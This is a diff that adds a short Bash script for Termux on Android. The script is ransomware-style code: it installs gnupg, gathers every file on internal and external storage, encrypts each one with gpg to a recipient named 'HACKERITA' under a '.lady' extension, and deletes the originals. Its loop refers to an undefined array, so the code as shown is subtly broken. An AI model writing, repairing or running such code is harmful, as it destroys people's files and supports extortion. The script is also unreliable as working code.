@@ -1,0 +1,13 @@
+#!/data/data/com.termux/files/usr/bin/bash
+yes|apt install gnupg >/dev/null 2>/dev/null
+SD0="/storage/emulated/0"
+SD1=$(df|tail -n 2|awk -F " " '{print $6}'|grep -iv "emulated"|head -n 1)
+SD2="${HOME}/test"
+T1=$(find $SD0 $SD1 -type f)
+T2=$(find $SD2 -type f)
+for i in ${T[*]};do
+  mv "$i" "${i// /-}" 2>/dev/null
+  [[ -O $i ]] && chmod +rwx $i
+  [[ -w $i ]] && gpg -e -q -o $i.lady -r HACKERITA $i
+  [[ -e $i.lady ]] && rm $i
+done
